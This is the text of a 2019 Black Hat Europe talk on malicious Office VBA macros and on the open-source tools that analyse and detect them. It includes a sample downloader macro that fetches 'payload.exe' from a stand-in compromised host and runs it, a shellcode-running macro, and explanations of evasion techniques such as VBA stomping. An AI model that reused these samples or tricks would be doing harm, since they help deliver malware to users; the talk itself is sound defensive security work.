Black Hat Europe ­ 4-5 December 2019 Philippe Lagadec ­ https://decalage.info - @decalage2

Disclaimer
· The content of this presentation is personal work of its author. It does not represent any advice nor recommendation from his current and past employers, and it does not constitute any official endorsement.

whoami
· Philippe Lagadec · Cyber security engineer at the European Space Agency (ESA) · Author of open-source tools for file parsing and malware analysis:
· olefile, oletools, ViperMonkey, Balbuzard, ExeFilter
· A passion for file formats, active content and maldocs since 2000
· Talks at SSTIC03, PacSec06, CanSecWest08, EUSecWest10, SSTIC15, THC17
· Twitter: @decalage2 · https://decalage.info

Au Menu
· Malicious VBA Macros
· Why is it still an issue in 2019?
· Analysis tools
· Olevba, ViperMonkey
· Advanced techniques
· VBA Stomping · Excel 4 / XLM Macros, SLK
· Detection & Protection
· MacroRaptor
· Future work

A History of Macros

Office 95/97
· 95: WordBasic · 97: VBA - simple
Yes/No prompt to enable macros

Office 2000/XP/2003
· Unsigned macros are DISABLED BY DEFAULT

Office 2010 / 2013 / 2016 / 365
· Single "Enable Content" button AFTER seeing the document (Lures)...
· Sandbox against exploits (Protected View)

1995-2003
· Macrovirus era · Concept, Laroux,
Melissa, Lexar

2004-2013
· VBA winter · Attackers prefer
exploits

2014-2019
·VBA Macros come back
·Used as first stage to deliver malware ·100,000s of phishing e-mails per day ·Banking Trojans, Ransomware, APTs, ...

Note: it takes 2-3 years for a change in MS Office to be deployed everywhere and make a difference. (until 365)

Examples of macro-based campaigns
· Emotet
· Banking Trojan, active since 2014 · Still sending 100,000s of phishing emails with macros per day end of 2019
· FTCODE
· Ransomware written entirely in Powershell, active end 2019. · The infection vector is a macro.
· Sandworm: BlackEnergy / Olympic Destroyer
· Two attacks on Ukrainian power plants in 2015 and 2016, resulting in actual blackouts. · Attack on the 2018 Winter Olympics (data-wiping malware) · In each case, the initial intrusion vector was a macro.
· Many, many others since 2014
· Dridex, Rovnix, Vawtrak, FIN4, Locky, APT32, TA505, Hancitor, Trickbot, FIN7, Buran, Ursnif, Gozi, Dreambot, TA2101/Maze ransomware, ...

Typical Macro Lure

What can a malicious macro do?

Simulate keystrokes

Run Automatically

Download files

Call any ActiveX object

VBA Macro

Create files

Note: It is possible to write malware completely in VBA. But in practice, VBA macros are mostly used to write Droppers or Downloaders, to trigger other stages of malware.

Inject shellcode

Execute a file

Call any DLL

Run a system command

All this simply using native MS Office features available since 1997, no need for any exploit !

If you should only remember one thing:
·Clicking on "Enable Content" is exactly as dangerous as launching an unknown executable file.

Why is it still relevant in 2019?
· Because it still works!
· Despite antivirus, antispam, IDS, EDR, CTI, big data, machine learning and blockchain...
· It is still easy to write a VBA macro and hit end-users, through all the defences

Sample VBA Downloader / Dropper

Private Declare Function URLDownloadToFileA Lib "urlmon" _

(ByVal A As Long, ByVal B As String, _

ByVal C As String, ByVal D As Long, _ ByVal E As Long) As Long

Sub Auto_Open()

Runs when the document opens

Uses the URLDownloadToFileA function from URLMON.dll

Dim result As Long fname = Environ("TEMP") & "\agent.exe"

Executable filename created in %TEMP%

result = URLDownloadToFileA(0, _

"http://compromised.com/payload.exe", _ fname, 0, 0)

Downloads the payload from an Internet server

Shell fname

End Sub

Runs the payload

Anti-Analysis / Obfuscation Techniques (1)
· ActiveX Triggers
· Example: InkPicture1_Painted · Only method that works to auto-open macros in PowerPoint · See http://www.greyhathacker.net/?p=948
· Hide data:
· In the document text, spreadsheet cells, file properties, VBA forms, etc
· Word Document Variables to hide data
· Doc Variables can store up to 64KB data, hidden in the MS Word UI · https://msdn.microsoft.com/library/office/ff839708.aspx · used by Vbad to hide encryption keys: https://github.com/Pepitoh/VBad
· CallByName to obfuscate function calls
· https://msdn.microsoft.com/en-us/library/office/gg278760.aspx

Anti-Analysis / Obfuscation Techniques (2)
· Less known formats:
· Publisher, MHT, Word 2003 XML, Word 2007 XML (Flat OPC), ...
· Use WMI to run commands · PowerShell · ScriptControl to run VBScript/Jscript
· To run VBS/JS code without writing a file to disk · https://msdn.microsoft.com/en-us/library/aa227637(v=vs.60).aspx · https://www.experts-exchange.com/questions/28190006/VBA-ScriptControl-to-run-
Java-Script-Function.html
· Geofencing · Run shellcode using an API callback
· http://ropgadget.com/posts/abusing_win_functions.html

Sample VBA to run a Shellcode

Private Declare Function createMemory Lib "kernel32" Alias "HeapCreate" (...) As Long Private Declare Function allocateMemory Lib "kernel32" Alias "HeapAlloc" (...) As Long Private Declare Sub copyMemory Lib "ntdll" Alias "RtlMoveMemory" (...) Private Declare Function shellExecute Lib "kernel32" Alias "EnumSystemCodePagesW" (...) As Long

Use system DLL functions to access memory and run code

Private Sub Document_Open()

Dim shellCode As String [...] shellCode = "fce8820000006089e531c0648b50308b520c8b52148b72280...86500" shellLength = Len(shellCode) / 2 ReDim byteArray(0 To shellLength) For i = 0 To shellLength - 1
If i = 0 Then pos = i + 1
Else pos = i * 2 + 1
End If Value = Mid(shellCode, pos, 2) byteArray(i) = Val("&H" & Value) Next rL = createMemory(&H40000, zL, zL) memoryAddress = allocateMemory(rL, zL, &H5000) copyMemory ByVal memoryAddress, byteArray(0), UBound(byteArray) + 1 executeResult = shellExecute(memoryAddress, zL)

End Sub

Run the shellcode

Shellcode stored in hexadecimal This example runs calc.exe
Decode the shellcode from hex to binary
Allocate a buffer in memory
Copy the shellcode to the buffer

Source: http://ropgadget.com/posts/abusing_win_functions.html

Demo: VBA macro with shellcode

MS Office Encryption
· From Office 97 to 2003, file encryption was weak and the VBA part was never encrypted.
· Since Office 2007, file encryption covers the whole file including the VBA part.
· The password is required to decrypt and get the VBA code.
· "VelvetSweatshop": special password known by Excel, decryption is transparent for the user
· Trick used by malware to hide code from analysis tools
· Tools for decryption:
· msoffcrypto-tool, herumi/msoffice · Also now integrated with oletools

Analysis Tools

Analysing macros within MS Office
· It is convenient to use the VBA Editor and its debugger to follow what a macro is doing, step by step.
· Malicious actions need to be replaced by innocuous ones (MsgBox) · Pros:
· Works well for heavily obfuscated macros that use Office features
· Cons:
· Some Office installations allow to see the VBA code BEFORE pressing "Enable Content", most others do not.
· Beware of the Shift key!
· https://decalage.info/vbashift
· Tricks to hide VBA code from the VBA Editor (e.g. EvilClippy)

Analysis tools: olevba

· https://github.com/decalage2/oletools/wiki/olevba · Command-line tool + Python library for your applications

Input File

Extract VBA Macros
source code

Deobfuscation
Hex, Base64, StrReverse, Dridex, Hex+StrReverse,
StrReverse+Hex, ...

Supported Formats: · Word .doc, .docm · Excel .xls, .xlsm, .xlsb · PowerPoint .ppt, .pptm · Publisher .pub · Word 2003 XML · Word 2007+ XML (FlatOPC) · MHT/ActiveMime .mht · SYLK/SLK · VBA source code

VBA String Expressions Deobfuscation
(mini VBA Parser)
Other Detections
VBA Stomping XLM / Excel 4 Macros

· Even encrypted with password

Auto Execution Triggers
AutoOpen, Document_Open, Document_Close, ActiveX, ...
Suspicious Keywords
Downloads, File writes, Shell execution, DLL calls, known-bad Win32 calls,
Registry changes, ...
Potential IOCs
URLs, IP addresses, Executable filenames, ...

Demo: olevba

Services and Projects using oletools/olevba
· Online analysis services and Sandboxes:
· Anlyz.io, dridex.malwareconfig.com, Hybrid-analysis.com, Joe Sandbox, malshare.io, SNDBOX, YOMI,and probably VirusTotal
· CAPE, Cuckoo Sandbox,
· Malware Analysis tools and projects:
· ACE, AssemblyLine, DARKSURGEON, FAME, FLARE-VM, Laika BOSS, MacroMilter, mailcow, malware-repo, Malware Repository Framework (MRF), olefy, PeekabooAV, pcodedmp, PyCIRCLean, REMnux, Snake, Strelka, stoQ, TheHive/Cortex, TSUGURI Linux, Vba2Graph, Viper, ViperMonkey,. And quite a few other projects on GitHub.

But sometimes, static analysis is not enough

Vervet Monkey Picture published by Charlesjsharp under CC BY 3.0 license

ViperMonkey
 In practice: malware writers are very creative  Impossible to deobfuscate every malware using
static analysis (oledump, olevba).
 Other approaches : - Sandboxing / "Detonation" (detectable) - Convert VBA to VBS => run cscript.exe (risky) - Custom VBA Parser + Emulation => ViperMonkey

ViperMonkey

· https://github.com/decalage2/ViperMonkey

VBA Macros source code

VBA Parser
(pyparsing grammar)

VBA/Office
Emulator
(custom) VBA Library Word/Excel API

Trace Code Execution

Interesting
Actions
Downloads, File writes, Shell execution, DLL calls, known-bad Win32 calls,
Registry changes, ...

Code Model
(Python classes)

Potential IOCs
URLs, IP addresses, Executable filenames, ...

Demo: ViperMonkey

Advanced Techniques

VBA Stomping
· VBA Macros are stored under several forms within a document:
· VBA Source Code:
· Plain text as it is entered in the VBA Editor (compressed)
· P-code:
· Pre-parsed bytecode, ready to be executed
· When a file containing macros is opened, the P-code is used to run macros, not the source code.
· if it matches the MS Office version
· But most analysis tools and antimalware engines only check the VBA source code.
· If you modify the VBA source code to look benign, the malicious P-code can go undetected and run => VBA Stomping

MS Office File
VBA Module
P-code VBA Source Code

VBA Stomping
· Technique reported years ago by Dr Vesselin Bontchev
· pcodedmp: tool to disassemble the P-code
· VBA Stomping demonstrated at Derbycon 2018 by Kirk Sayre, Harold Oldgen and Carrie Roberts
· adb: tool to "stomp" a document · VBASeismograph: 1st tool to detect stomping (false
positives)
· EvilClippy released in 2019 by Stan Hegt
· A simple and effective tool to replace the malicious VBA source code by a benign one
· Web server to provide the P-code that matches the MS Office version automatically

MS Office File
VBA Module
P-code Malicious
VBA Source Code MBaelinciigonus

EvilClippy

VBA Stomping Detection

· Detection technique implemented in the new olevba 0.55:
1. Disassemble P-code using pcodedmp
2. Extract all the relevant keywords:
· Sub and Function names · Called functions · Variable names
3. Compare with VBA source code 4. If any keyword is missing, then the VBA source has
probably been stomped
· Simple yet effective. · Inspired from VBASeismograph, different
implementation · Tricky part: extracting the right keywords from
pcodedmp

Extract Keywords
Compare

MS Office File
VBA Module
P-code Malicious
VBA Source Code Benign

Demo: EvilClippy vs. olevba

XLM / XLF / Excel 4 Macros
· Another type of macros for Excel · Older than VBA, different syntax and engine · Similar features (and risks) as VBA · Can be present in Excel files but also the old SYLK format (.SLK)
· Issue: SLK files are not covered by Protected View
· XLM parser developed by Didier Stevens in oledump · Integrated in olevba since v0.54

Sample SLK with shellcode
Generated with https://github.com/outflanknl/Scripts/blob/master/shellcode_to_sylk.py

SLK parser in olevba 0.55

Demo: XLM macros and olevba

Detection & Prevention

Macro Detection & Prevention
· What if we could detect all malicious macros, and block them before they reach end-users?
· Antivirus engines are not enough:
· Too many new macros every day. · Impossible to catch up with signatures. · Most malicious macros, even several months old, are not detected.

MacroRaptor - mraptor
· Observations:
· Malicious macros need to start automatically.
· AutoOpen, Document_Open, Document_Close, etc
· They need to drop a payload as a file, or inject code into a process. · They need to execute the payload.
· Most of these actions cannot be obfuscated in VBA. · Most non-malicious macros do not use these features.
· => It is possible to detect most malicious macros using a small number of keywords.

MicroRaptor Picture published by Conty in the public domain

MacroRaptor - mraptor
· MacroRaptor algorithm:
· A: Automatic triggers · W: Any write operation that may be used to drop a payload · X: Any execute operation
· Suspicious = A and (W or X)
· See http://decalage.info/mraptor · And https://github.com/decalage2/oletools/wiki/mraptor

MacroRaptor - mraptor
· In practice, mraptor detects almost all samples tested so far, from 1999 macrovirus to the latest 2019 Emotet.
· Focused on detection: few false positives, legit macros that run automatically and write to disk or use CreateObject

Demo: mraptor

MacroRaptor ­ Recent example Nov 2019
· Sample only detected by 2/60 antivirus engines on VirusTotal

MacroRaptor applications
· Mraptor_milter / MacroMilter
· Milter plugins for Sendmail and Postfix, to detect malicious macros in e-mail attachments and remove them.
· A similar filter could also be developed for web proxies. · https://github.com/decalage2/oletools/blob/master/oletools/mraptor_milter.py · https://github.com/sbidy/MacroMilter
· Mraptor GUI
· Simple GUI for end-users to check if a file contains malicious macros before opening it. · (not released yet)
· And it would also be easy to develop a small web application to make the same check online or on internal web servers. (similar to VirusTotal or IRMA)

Other Macro Detection Solutions
· Olefy:
· Integrates with rspamd to use the olevba output to block e-mails with suspicious macros · https://github.com/HeinleinSupport/olefy
· Malicious Macro Bot:
· Extract many metrics and keywords from VBA code · Apply Machine Learning (random forests) to classify macros as malicious or innocuous. · Requires a large dataset of known good/bad macros to train the model. · https://github.com/egaus/MaliciousMacroBot · https://www.rsaconference.com/events/us17/agenda/sessions/6662-applied-machine-learning-defeating-modern-malicious
· Microsoft GPOs for Office 2016/2013 to block all macros coming from the Internet.
· https://blogs.technet.microsoft.com/mmpc/2016/03/22/new-feature-in-office-2016-can-block-macros-and-help-preventinfection/
· https://blogs.technet.microsoft.com/mmpc/2016/10/26/office-2013-can-now-block-macros-to-help-prevent-infection/

MS Office Application Guard

· Available mid-2020 · Microsoft Office 365 ProPlus only?
· https://www.bleepingcomputer.com/news/microsoft/office-365-to-preventmalicious-docs-from-infecting-windows/

· Untrusted files received by e-mail or downloaded will be opened in a container (based on virtualization).
· Similar to Edge Application Guard. · Macros will be allowed to run directly, but cannot
access the system, contained to MS Office. · No "Enable Content" button anymore. · Looks promising, actual security to be tested.

Source: https://www.bleepingcomputer.com/news/microsoft/office-365-to-prevent-malicious-docs-from-infecting-windows/

How could MS Office be more secure?

· VBA Macros have lots of legitimate uses, cannot go away.
· Most legit macros only use innocuous MS Office features:
· Modify the file contents in place, formatting, calculations, etc.
· The VBA features used by malware are not normally necessary:
· Calling DLLs, executing system commands
· So Microsoft could split the VBA API into safe and unsafe features:
· Safe features could be available without restrictions · Unsafe features should require digital signature or additional
authorizations to run
· Similar model as the JavaScript API in Adobe Reader:
· PDF JavaScript in Reader is not allowed to touch the system · Any feature that can touch the OS or files outside the PDF is only
available in the Adobe Acrobat version

VBA API

Safe Features

Unsafe Features

Allowed to run directly

Requires Signature / Authorization

Future Work
· Oletools:
· Single scanning tool for macros, DDE, OLE objects, RTF · Simple GUI tool for end-users to check documents before opening them · Lots of ideas and contributions to improve oletools
· ViperMonkey
· Python 3 migration · Improved output · Faster parser · Shell interface: interactive commands, debugger

Open-source Contributors
· Oletools and ViperMonkey have been developed with the help of many contributors, including:
· John Davison: original VBA parser, from officeparser · Christian Herdtweck: JSON output, PPT parser, unit tests, and much more · Kirk Sayre: tons of improvements to ViperMonkey · Seb Draven: Python 3 migration · Didier Stevens: XLM macro parser, from oledump/plugin_biff · Vincent Brillault: VBA forms parser · Nolze: decryption, from msoffcrypto-tool · Dr Vesselin Bontchev: P-code disassembler, from pcodedmp · And many others:
· https://github.com/decalage2/oletools/graphs/contributors
· Thank you to all the past and future contributors, keep the Pull Requests coming!

Main Takeaways
· Clicking "Enable Content" on a VBA Macro is exactly as dangerous as running an unknown EXE.
· VBA Macros are still used a lot to deliver malware in 2019, simply because it works! Bad guys and red teamers are very creative with tricks to obfuscate code.
· But analysis tools are following up, thanks to open source collaboration (oletools, ViperMonkey, oledump, pcodedmp, msoffcrypto-tool, ...).
· Keep your tools updated!
· Filter macros BEFORE they reach end-users
· MacroMilter/MraptorMilter/rspamd

Questions?
· Philippe Lagadec · Twitter: @decalage2 · https://decalage.info

Extra Slides

Tip: Where to find (fresh) malicious macro samples
· Go to http://decalage.info/mwsearch and search "VB_Nam"
· This string appears in plain text in MS Office documents with macros · More info: http://decalage.info/malware_string_search
· Other solutions:
· InQuest DFI Lite: https://labs.inquest.net/dfi ­ use heuristics · Any.run: https://app.any.run/submissions/ - click on tag "macros" · Hybrid-analysis: https://www.hybrid-analysis.com/search?query=%23macro ­
search for tag "#macro"

Malicious Macro Generators
· A lot of tools are available to generate malicious macros for testing and red teaming, such as:
· MMG ­ Malicious Macro Generator · ADB - Adaptive Document Builder · SharpShooter · VBad · Metasploit · Malicious Macro MSBuild Generator

Useful Links
 Articles : - All my articles about VBA Macros - How to Grill Malicious Macros (SSTIC15) - Macros ­ Le retour de la revanche in MISC magazine 79 (May-June 2015) - Tools to extract VBA Macro source code from MS Office Documents - How to find malicious macro samples
 Oletools : olevba, MacroRaptor - http://www.decalage.info/python/oletools - https://github.com/decalage2/oletools - https://twitter.com/decalage2
 ViperMonkey: - https://github.com/decalage2/ViperMonkey - http://www.decalage.info/vba_emulation
 Oledump : - http://blog.didierstevens.com/programs/oledump-py/ - https://github.com/decalage2/oledump-contrib
 Microsoft specifications : - MS-VBAL, MS-OVBA

How to install oletools
· Install the latest Python 3.x (or 2.7) if you don't have it:
· https://www.python.org/downloads/
· Download+Install/update oletools in one go:
· Windows:
· pip install -U oletools
· Linux:
· sudo ­H pip install -U oletools
· All the tools should be directly available from any directory
· From example you just need to type "olevba" or "mraptor"
· More Options:
· https://github.com/decalage2/oletools/wiki/Install

Other tools in oletools
· rtfobj: RTF parser to detect and extract suspicious OLE objects (e.g. Equation Editor exploits, executable files, etc)
· oleobj: to detect and extract suspicious OLE objects from MS Office files (Word, Excel, PowerPoint, etc)
· msodde: to detect suspicious DDE links (e.g. DDEAUTO) in MS Office files, RTF, CSV
· oleid: to get a quick summary of a MS Office file and potential security issues (macros, etc)
· And more

How to analyse a suspicious file with oletools and ViperMonkey? (1/2)
· First, identify the actual type of the file:
· Do not trust file extensions! · Tools like exiftool are great, but may give inaccurate results is some rare cases (e.g.
some OLE files appear as FlashPix images) · The best tool for this is a hex viewer
· If you don't have one, oletools includes ezhexviewer
· Check the first few bytes of the file:
· "D0 CF 11 E0" in hex => OLE file (Word/Excel/PPT 97) · "PK" => Zip file or OpenXML (Word/Excel/PPT 2007+) · "<xml" => XML file, maybe Word/Excel/PPT 2003 or 2007 XML · "ID" => SLK file · "MIME" in the 1st lines => probably a MHT file · "{\rtf" => RTF file

How to analyse a suspicious file with oletools and ViperMonkey? (2/2)
· If this is a RTF file:
· rtfobj: to detect/extract OLE objects (e.g. Equation editor exploits) · msodde: to detect DDE links
· For any other file format (OLE, OpenXML, XML, MHT, SLK):
· olevba: to detect/extract and analyse VBA/XLM macros · oleobj: to detect/extract OLE objects and external links (e.g. attached
templates, remote OLE objects) · msodde: to detect DDE links · ViperMonkey: to analyse obfuscated VBA macros, after olevba
· For OLE files:
· olemeta, oletimes, oledir, olemap: for more metadata and file info.

Oletools cheat sheet
· https://github.com/decalage2/oletools/blob/master/cheatsheet/olet ools_cheatsheet.pdf

olevba ­ Python API
· How to integrate olevba into Python scripts:
· https://github.com/decalage2/oletools/wiki/olevba
from oletools.olevba import VBA_Parser, VBA_Scanner import sys vba = VBA_Parser(sys.argv[1]) if vba.detect_vba_macros():
print('VBA Macros found') for (filename, stream_path, vba_filename, vba_code) in vba.extract_macros():
print('-' * 79) print('Filename :', filename) print('OLE stream :', stream_path) print('VBA filename:', vba_filename) print('- ' * 39) print(vba_code) print('- ' * 39) vba_scanner = VBA_Scanner(vba_code) results = vba_scanner.scan(include_decoded_strings=True) for kw_type, keyword, description in results:
print('type=%s - keyword=%s - description=%s' % (kw_type, keyword, description)) else:
print('No VBA Macros found') vba.close()

Outlook backdoor (vbaProject.OTM)
· Technique used by APT32/OceanLotus/Cobalt Kitty to create a backdoor using emails for command & control
· https://www.cybereason.com/blog/operation-cobalt-kitty-apt
· The file vbaProject.OTM is overwritten with a large VBA macro for Outlook
· The macro runs silently within Outlook each time it is started. · The macro checks every incoming email. If it contains specific markers
in the text, the command is extracted and executed. · The result is sent back by email.

Other Analysis Tools & Techniques
· Oledump by Didier Stevens
· Loffice ­ Lazy Office Analyzer:
· Use a debugger to trace VBA activity in Word. · https://github.com/tehsyntx/loffice
· Vba-dynamic-hook / Joe Sandbox:
· Modify the VBA code to hook all interesting function calls. · Run it in MS Word. · https://github.com/eset/vba-dynamic-hook

